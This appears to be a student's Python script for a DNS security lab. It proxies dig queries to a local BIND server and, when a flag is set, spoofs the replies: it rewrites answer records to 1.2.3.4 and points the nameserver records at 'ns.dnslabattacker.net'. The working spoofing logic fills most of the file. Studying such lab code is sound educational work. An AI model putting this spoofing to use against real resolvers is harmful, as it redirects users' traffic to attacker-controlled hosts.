#!/usr/bin/env python2
import argparse
import socket
from scapy.all import *

# This is going to Proxy in front of the Bind Server

parser = argparse.ArgumentParser()
parser.add_argument("--port", help="port to run your proxy on - careful to not run it on the same port as the BIND server", type=int)
parser.add_argument("--dns_port", help="port the BIND uses to listen to dns queries", type=int)
parser.add_argument("--spoof_response", action="store_true", help="flag to indicate whether you want to spoof the BIND Server's response (Part 3) or return it as is (Part 2). Set to True for Part 3 and False for Part 2", default=False)
args = parser.parse_args()

# Port to run the proxy on
port = args.port
# BIND's port
dns_port = args.dns_port
# Flag to indicate if the proxy should spoof responses
# True or False
SPOOF = args.spoof_response
# Default IP
DNS_SERVER_IP = "127.0.0.1"

def spoof(packet):
    packet = scapy.all.DNS(packet)
    packet["DNSRR"].rdata = "1.2.3.4"
    num_ns = packet["DNS"].nscount
    for i in range(num_ns):
        packet["DNS"].ns[i].rdata = "ns.dnslabattacker.net."
    packet = bytes(packet)
    return packet


def forward(request):
    bind_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    bind_socket.sendto(request, (DNS_SERVER_IP, dns_port))

    response, address = bind_socket.recvfrom(4096)

    bind_socket.close()

    if SPOOF:
        response = spoof(response)

    return response


def server():
    dig_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    dig_socket.bind((DNS_SERVER_IP, port))

    while True:
        try:
            print("Waiting for dig request")
            request, address = dig_socket.recvfrom(4096)

            print("Request received. Forwarding request...")
            response = forward(request)

            print("Response received. Replying to dig with response...")
            dig_socket.sendto(response, address)
            print("Reply sent.")
        except KeyboardInterrupt:
            print("Closing dig socket...")
            dig_socket.close()
            break


if __name__ == "__main__":
    server()